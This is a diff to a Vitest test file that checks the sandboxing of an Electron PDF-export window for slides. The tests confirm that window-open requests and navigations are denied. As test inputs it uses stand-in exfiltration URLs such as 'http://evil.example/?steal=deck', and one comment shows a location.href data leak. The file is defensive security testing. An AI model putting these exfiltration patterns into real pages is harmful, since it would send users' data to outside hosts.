@@ -9,15 +9,29 @@ import { afterEach, describe, expect, it, vi } from 'vitest'
  * throws.
  */
 
+type WindowOpenHandler = (details: { url: string }) => { action: string }
+type NavListener = (event: { preventDefault: () => void }, url: string) => void
+
 const mocks = vi.hoisted(() => {
   const instances: FakeWindow[] = []
   class FakeWindow {
     static readonly instances: FakeWindow[] = instances
     readonly options: unknown
     destroyed = false
+    windowOpenHandler: WindowOpenHandler | undefined
+    readonly listeners = new Map<string, NavListener[]>()
     readonly webContents = {
       id: 500 + instances.length,
       setZoomFactor: vi.fn((_factor: number): void => undefined),
+      setWindowOpenHandler: vi.fn((handler: WindowOpenHandler): void => {
+        this.windowOpenHandler = handler
+      }),
+      on: vi.fn((event: string, listener: NavListener): unknown => {
+        const bucket = this.listeners.get(event) ?? []
+        bucket.push(listener)
+        this.listeners.set(event, bucket)
+        return this.webContents
+      }),
       loadURL: vi.fn((_url: string): Promise<void> => Promise.resolve()),
       executeJavaScript: vi.fn((_code: string, _userGesture?: boolean): Promise<unknown> =>
         Promise.resolve(true),
@@ -29,6 +43,17 @@ const mocks = vi.hoisted(() => {
     constructor(options: unknown) {
       this.options = options
       instances.push(this)
+    }
+    /** Fire a captured event listener (e.g. `will-navigate`) and report whether it was prevented. */
+    emit(event: string, url: string): boolean {
+      let prevented = false
+      const evt = {
+        preventDefault: () => {
+          prevented = true
+        },
+      }
+      for (const listener of this.listeners.get(event) ?? []) listener(evt, url)
+      return prevented
     }
     isDestroyed(): boolean {
       return this.destroyed
@@ -75,6 +100,40 @@ describe('createOffscreenPdfRenderer', () => {
     })
     // No preload is exposed to the export window — the slide reaches neither app nor bridge.
     expect(options.webPreferences['preload']).toBeUndefined()
+    // Parity with the editor window's locked set: no node integration, sandbox on, no webview tag.
+    expect(options.webPreferences['nodeIntegration']).toBe(false)
+    expect(options.webPreferences['sandbox']).toBe(true)
+    expect(options.webPreferences['webviewTag']).toBe(false)
+    renderer.dispose()
+  })
+
+  it('denies every window-open on the export window (a slide cannot open a window)', async () => {
+    const registry = new SlideRegistry()
+    const renderer = createOffscreenPdfRenderer(registry)
+    await renderer.renderToPdf('<!doctype html><body>x', 0)
+
+    const win = mocks.instances[0]!
+    expect(win.webContents.setWindowOpenHandler).toHaveBeenCalledOnce()
+    expect(win.windowOpenHandler).toBeDefined()
+    // Whatever URL a slide asks to open — including an exfiltration attempt — is denied.
+    expect(win.windowOpenHandler!({ url: 'http://evil.example/?steal=deck' })).toEqual({
+      action: 'deny',
+    })
+    expect(win.windowOpenHandler!({ url: 'about:blank' })).toEqual({ action: 'deny' })
+    renderer.dispose()
+  })
+
+  it('blocks every renderer-initiated navigation off the loaded slide document', async () => {
+    const registry = new SlideRegistry()
+    const renderer = createOffscreenPdfRenderer(registry)
+    await renderer.renderToPdf('<!doctype html><body>x', 0)
+
+    const win = mocks.instances[0]!
+    expect(win.webContents.on).toHaveBeenCalledWith('will-navigate', expect.any(Function))
+    // A slide doing `location.href = 'http://evil?='+data` is prevented.
+    expect(win.emit('will-navigate', 'http://evil.example/?steal=deck')).toBe(true)
+    // Even a sibling slide:// navigation is prevented — export needs no in-page navigation at all.
+    expect(win.emit('will-navigate', 'slide://deadbeef/')).toBe(true)
     renderer.dispose()
   })
 
@@ -134,6 +193,18 @@ describe('createOffscreenPdfRenderer', () => {
     if (mocks.instances[0]) {
       expect(mocks.instances[0].webContents.printToPDF).not.toHaveBeenCalled()
     }
+    renderer.dispose()
+  })
+
+  it('clears the readiness timeout once the barrier settles (no timer outlives the race)', async () => {
+    const clearSpy = vi.spyOn(globalThis, 'clearTimeout')
+    const registry = new SlideRegistry()
+    const renderer = createOffscreenPdfRenderer(registry)
+    // The barrier resolves via executeJavaScript (mocked to resolve immediately), so the 6 s timer
+    // must be cleared rather than left pending.
+    await renderer.renderToPdf('<!doctype html><body>x', 0)
+    expect(clearSpy).toHaveBeenCalled()
+    clearSpy.mockRestore()
     renderer.dispose()
   })
 
